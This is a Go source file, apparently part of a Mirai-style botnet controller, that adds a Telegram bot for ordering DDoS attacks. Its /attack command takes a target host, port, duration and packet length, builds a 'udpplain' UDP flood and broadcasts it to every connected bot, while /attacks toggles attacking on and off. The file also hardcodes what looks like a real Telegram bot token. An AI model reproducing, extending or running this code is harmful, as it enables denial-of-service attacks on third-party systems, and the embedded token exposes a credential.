package main

import (
	"fmt"
	tgbotapi "github.com/go-telegram-bot-api/telegram-bot-api/v5"
	"log"
	"strconv"
	"strings"
)

func setupbot() {
	bot, err := tgbotapi.NewBotAPI("6517831279:AAHdtOxuENnNWKkF6Mxdc-6qvxseocNHxGo")
	if err != nil {
		panic(err)
	}

	bot.Debug = false

	updateConfig := tgbotapi.NewUpdate(0)
	updateConfig.Timeout = 30

	updates := bot.GetUpdatesChan(updateConfig)

	for update := range updates {
		if update.Message == nil {
			continue
		}

		if update.Message.IsCommand() {
			msg := update.Message
			switch msg.Command() {
			case "attacks":
				commandHandler(msg, bot)
			case "attack":
				attackCommandHandler(msg, bot)
			default:
				SendMessage(msg.Chat.ID, "Unknown command", bot)
			}
		}
	}
}

func commandHandler(msg *tgbotapi.Message, bot *tgbotapi.BotAPI) {
	args := msg.CommandArguments()
	switch args {
	case "enable":
		attackstatus = true
		SendMessage(msg.Chat.ID, "Attacks enabled", bot)
	case "disable":
		attackstatus = false
		SendMessage(msg.Chat.ID, "Attacks disabled", bot)
	case "status":
		status := "Attacks are currently disabled"
		if attackstatus {
			status = "Attacks are currently enabled"
		}
		SendMessage(msg.Chat.ID, status, bot)
	default:
		SendMessage(msg.Chat.ID, "Invalid usage. Use /attacks <enable/disable/status>", bot)
	}
}

func attackCommandHandler(msg *tgbotapi.Message, bot *tgbotapi.BotAPI) {
	args := msg.CommandArguments()
	params := parseAttackCommandArgs(args)

	if len(params) != 4 {
		SendMessage(msg.Chat.ID, "Invalid usage. Use /attack <host> <port> <time> <len>", bot)
		return
	}

	host := params[0]
	port := params[1]

	atkdur, err := strconv.ParseUint(params[2], 10, 32)
	if err != nil {
		SendMessage(msg.Chat.ID, "Invalid atkdur. It should be a positive integer.", bot)
		return
	}
	length, err := strconv.ParseUint(params[3], 10, 32)
	if err != nil {
		SendMessage(msg.Chat.ID, "Invalid length. It should be a positive integer.", bot)
		return
	}

	cmd := fmt.Sprintf("!udpplain %s %d dport=%s len=%d", host, atkdur, port, length)

	atk, err := NewAttack(cmd, true, true)
	if err != nil {
		fmt.Println(err)
	}

	buf, err := atk.Build()
	if err != nil {
		fmt.Println(err)
	}

	BotCount := clientList.Count()
	clientList.QueueBuf(buf, -1, "")
	database.black(uint32(atkdur), cmd, -1)
	SendMessage(msg.Chat.ID, "Attack broadcasted to "+strconv.Itoa(BotCount)+" bots!", bot)
}

func parseAttackCommandArgs(args string) []string {
	return strings.Fields(args)
}

func SendMessage(chatID int64, text string, bot *tgbotapi.BotAPI) {
	msg := tgbotapi.NewMessage(chatID, text)
	_, err := bot.Send(msg)
	if err != nil {
		log.Printf("Failed to send message: %s", err)
	}
}
